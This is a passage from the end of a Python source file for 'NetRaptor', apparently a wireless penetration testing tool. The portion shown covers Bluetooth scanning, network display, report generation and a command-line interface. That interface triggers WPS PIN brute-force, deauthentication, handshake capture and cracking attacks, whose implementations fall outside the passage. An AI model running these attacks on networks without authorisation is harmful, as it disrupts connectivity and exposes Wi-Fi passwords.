            subprocess.run(['sudo', 'hciconfig', 'hci0', 'up'], capture_output=True)
            
            # Scan for devices
            result = subprocess.run(['sudo', 'hcitool', 'scan', '--length', str(timeout//4)], 
                                  capture_output=True, text=True, timeout=timeout)
            
            devices = []
            for line in result.stdout.split('\n'):
                if ':' in line and len(line.split('\t')) >= 2:
                    parts = line.split('\t')
                    if len(parts) >= 2:
                        mac = parts[1].strip()
                        name = parts[2].strip() if len(parts) > 2 else 'Unknown'
                        devices.append({'mac': mac, 'name': name})
            
            self.bluetooth_devices = devices
            print(f"{Colors.GREEN}[+] Found {len(devices)} Bluetooth devices{Colors.END}")
            
            if devices:
                print(f"\n{Colors.CYAN}Bluetooth Devices:{Colors.END}")
                for i, device in enumerate(devices, 1):
                    print(f"  {i}. {device['name']} ({device['mac']})")
            
            return devices
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Bluetooth scan failed: {e}{Colors.END}")
            return []

    def display_networks(self):
        """Display discovered networks"""
        if not self.networks:
            print(f"{Colors.YELLOW}[!] No networks found{Colors.END}")
            return
        
        print(f"\n{Colors.HEADER}{'='*110}")
        print(f"                                     DISCOVERED NETWORKS")
        print(f"{'='*110}{Colors.END}")
        
        print(f"{Colors.BOLD}{'#':<3} {'ESSID':<32} {'BSSID':<18} {'CH':<3} {'PWR':<4} {'Privacy':<8} {'Cipher':<10} {'Auth'}{Colors.END}")
        print("-" * 110)
        
        sorted_networks = sorted(self.networks.items(), 
                               key=lambda x: int(x[1]['power']) if x[1]['power'].lstrip('-').isdigit() else -100, 
                               reverse=True)
        
        for i, (bssid, network) in enumerate(sorted_networks, 1):
            essid = network['essid']
            
            # Handle long ESSIDs properly - truncate with ellipsis if needed
            if len(essid) > 30:
                essid_display = essid[:27] + "..."
            else:
                essid_display = essid
            
            # Color code by security
            if 'OPN' in network['privacy'] or network['privacy'] == '':
                color = Colors.RED
            elif 'WEP' in network['privacy']:
                color = Colors.YELLOW
            else:
                color = Colors.GREEN
            
            print(f"{color}{i:<3} {essid_display:<32} {bssid:<18} {network['channel']:<3} "
                  f"{network['power']:<4} {network['privacy']:<8} {network['cipher']:<10} {network['authentication']}{Colors.END}")

    def generate_report(self, output_format="both"):
        """Generate comprehensive security report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        report = {
            'scan_info': {
                'timestamp': timestamp,
                'interface': self.interface,
                'tool_name': 'NetRaptor',
                'tool_version': '2.0',
                'author': 'Lokidres'
            },
            'summary': {
                'total_networks': len(self.networks),
                'wps_networks': len(self.wps_networks),
                'bluetooth_devices': len(self.bluetooth_devices),
                'handshakes_captured': len(self.handshakes)
            },
            'networks': self.networks,
            'wps_networks': self.wps_networks,
            'bluetooth_devices': self.bluetooth_devices,
            'handshakes': self.handshakes
        }
        
        files_created = []
        
        # JSON Report
        if output_format in ["json", "both"]:
            json_file = f"netraptor_audit_{timestamp}.json"
            with open(json_file, 'w') as f:
                json.dump(report, f, indent=2)
            files_created.append(json_file)
        
        # HTML Report
        if output_format in ["html", "both"]:
            html_file = f"netraptor_audit_{timestamp}.html"
            self.generate_html_report(report, html_file)
            files_created.append(html_file)
        
        print(f"\n{Colors.GREEN}[+] Reports generated:{Colors.END}")
        for file in files_created:
            print(f"    {file}")
        
        return files_created

    def generate_html_report(self, report, filename):
        """Generate HTML report"""
        # Generate network table rows
        network_rows = ""
        for bssid, net in report['networks'].items():
            network_rows += f"<tr><td>{net['essid']}</td><td>{bssid}</td><td>{net['channel']}</td><td>{net['power']}</td><td>{net['privacy']}</td><td>{net['cipher']}</td></tr>"
        
        html_content = f"""<!DOCTYPE html>
<html>
<head>
    <title>NetRaptor Security Audit Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; }}
        .header {{ background: #2c3e50; color: white; padding: 20px; text-align: center; }}
        .summary {{ background: #ecf0f1; padding: 15px; margin: 20px 0; }}
        .critical {{ color: #e74c3c; font-weight: bold; }}
        .high {{ color: #f39c12; font-weight: bold; }}
        .medium {{ color: #3498db; font-weight: bold; }}
        .low {{ color: #27ae60; font-weight: bold; }}
        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
        th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
        th {{ background-color: #34495e; color: white; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🦅 NetRaptor Security Audit Report</h1>
        <p>Generated: {report['scan_info']['timestamp']}</p>
        <p>Author: {report['scan_info']['author']} | Version: {report['scan_info']['tool_version']}</p>
    </div>
    
    <div class="summary">
        <h2>Summary</h2>
        <p>Total Networks: {report['summary']['total_networks']}</p>
        <p>WPS-Enabled Networks: {report['summary']['wps_networks']}</p>
        <p>Bluetooth Devices: {report['summary']['bluetooth_devices']}</p>
        <p>Handshakes Captured: {report['summary']['handshakes_captured']}</p>
    </div>
    
    <h2>Discovered Networks</h2>
    <table>
        <tr><th>ESSID</th><th>BSSID</th><th>Channel</th><th>Power</th><th>Privacy</th><th>Cipher</th></tr>
        {network_rows}
    </table>
    
    <footer style="text-align: center; margin-top: 40px; color: #666;">
        <p>Generated by NetRaptor v2.0 | <a href="https://github.com/Lokidres/NetRaptor">GitHub</a></p>
    </footer>
    
</body>
</html>"""
        
        with open(filename, 'w') as f:
            f.write(html_content)

def main():
    parser = argparse.ArgumentParser(description='NetRaptor - Advanced Wireless Penetration Testing Tool', 
                                   add_help=False)
    
    # Interface options
    parser.add_argument('-i', '--interface', help='Wireless interface')
    parser.add_argument('-t', '--timeout', type=int, default=30, help='Scan timeout (default: 30s)')
    parser.add_argument('-h', '--help', action='store_true', help='Show help message')
    
    # Core features
    parser.add_argument('--scan', action='store_true', help='Basic wireless network discovery')
    parser.add_argument('--wpa-audit', action='store_true', help='WPA/WPA2 security audit')
    parser.add_argument('--wps-test', action='store_true', help='WPS vulnerability testing')
    parser.add_argument('--wps-attack', help='WPS PIN brute force attack on target BSSID')
    parser.add_argument('--deauth', help='Deauthentication attack on target BSSID')
    parser.add_argument('--handshake', help='Capture handshake from target BSSID')
    parser.add_argument('--crack-handshake', help='Crack captured handshake file (.cap)')
    parser.add_argument('--evil-twin', action='store_true', help='Detect Evil Twin access points')
    parser.add_argument('--bluetooth', action='store_true', help='Bluetooth device discovery')
    parser.add_argument('--injection-test', action='store_true', help='Test packet injection capability')
    
    # Advanced options
    parser.add_argument('--channel', type=int, help='Target channel for attacks')
    parser.add_argument('--output', choices=['json', 'html', 'both'], default='both', help='Report format')
    parser.add_argument('--wordlist', help='Custom wordlist for handshake cracking')
    parser.add_argument('--monitor-only', action='store_true', help='Only enable monitor mode and exit')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Initialize tool
    tool = WirelessPenTest()
    tool.print_banner()
    
    # Show help if requested or no flags provided
    if args.help:
        tool.print_usage()
        return
    
    # Check if any feature flag is provided
    feature_flags = [args.scan, args.wpa_audit, args.wps_test, args.wps_attack, args.deauth, 
                    args.handshake, args.crack_handshake, args.evil_twin, args.bluetooth, 
                    args.injection_test, args.monitor_only]
    
    if not any(feature_flags):
        print(f"{Colors.RED}[!] No feature flags specified!{Colors.END}")
        tool.print_usage()
        return
    
    # Setup signal handler
    signal.signal(signal.SIGINT, tool.signal_handler)
    
    try:
        # Check prerequisites
        if not tool.check_root():
            return
        
        available_tools = tool.check_dependencies()
        
        # Get interface
        if args.interface:
            tool.interface = args.interface
        else:
            interfaces = tool.get_interfaces()
            if not interfaces:
                print(f"{Colors.RED}[!] No wireless interfaces found{Colors.END}")
                return
            
            print(f"{Colors.CYAN}[*] Available interfaces: {', '.join(interfaces)}{Colors.END}")
            tool.interface = interfaces[0]
        
        print(f"{Colors.GREEN}[+] Using interface: {tool.interface}{Colors.END}")
        
        # Enable monitor mode if needed
        monitor_required = [args.wps_test, args.wps_attack, args.deauth, args.handshake, args.injection_test, args.monitor_only]
        if any(monitor_required) or (args.scan and available_tools.get('aircrack-ng', False)):
            monitor_interface = tool.enable_monitor_mode(tool.interface)
            tool.interface = monitor_interface
        
        # Monitor mode only
        if args.monitor_only:
            print(f"{Colors.GREEN}[+] Monitor mode setup completed on {tool.interface}{Colors.END}")
            return
        
        # Execute features based on flags
        
        # Basic network scan
        if args.scan:
            tool.networks = tool.scan_networks(tool.interface, args.timeout)
            tool.display_networks()
        
        # WPS testing
        if args.wps_test:
            if not available_tools.get('reaver', False):
                print(f"{Colors.YELLOW}[!] WPS testing requires 'reaver' package{Colors.END}")
            else:
                tool.scan_wps(tool.interface, args.timeout)
        
        # WPA audit
        if args.wpa_audit:
            tool.wpa_audit()
        
        # Evil twin detection
        if args.evil_twin:
            tool.evil_twin_detection()
        
        # Bluetooth scan
        if args.bluetooth:
            tool.bluetooth_scan(args.timeout)
        
        # Packet injection test
        if args.injection_test:
            tool.test_packet_injection(tool.interface)
        
        # Handshake cracking (doesn't require interface setup)
        if args.crack_handshake:
            tool.crack_handshake(args.crack_handshake, args.wordlist)
        
        # Targeted attacks
        if args.wps_attack:
            if not args.channel:
                print(f"{Colors.RED}[!] --channel required for WPS attack{Colors.END}")
            elif not available_tools.get('reaver', False):
                print(f"{Colors.RED}[!] WPS attack requires 'reaver' package{Colors.END}")
            else:
                # Ensure we have WPS scan data
                if not tool.wps_networks:
                    print(f"{Colors.CYAN}[*] Scanning for WPS networks first...{Colors.END}")
                    tool.scan_wps(tool.interface, 15)
                tool.wps_pin_attack(args.wps_attack, args.channel)
        
        if args.deauth:
            if not args.channel:
                print(f"{Colors.RED}[!] --channel required for deauth attack{Colors.END}")
            else:
                tool.deauth_attack(args.deauth, args.channel)
        
        if args.handshake:
            if not args.channel:
                print(f"{Colors.RED}[!] --channel required for handshake capture{Colors.END}")
            else:
                tool.capture_handshake(args.handshake, args.channel, args.timeout)
        
        # Generate report if any scan was performed
        scan_performed = any([args.scan, args.wpa_audit, args.wps_test, args.evil_twin, 
                            args.bluetooth, args.handshake, args.wps_attack])
        if scan_performed:
            tool.generate_report(args.output)
        
        print(f"\n{Colors.GREEN}[+] Operation completed successfully!{Colors.END}")
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Unexpected error: {e}{Colors.END}")
        if args.verbose:
            import traceback
            traceback.print_exc()
    finally:
        tool.cleanup()

if __name__ == "__main__":
    main()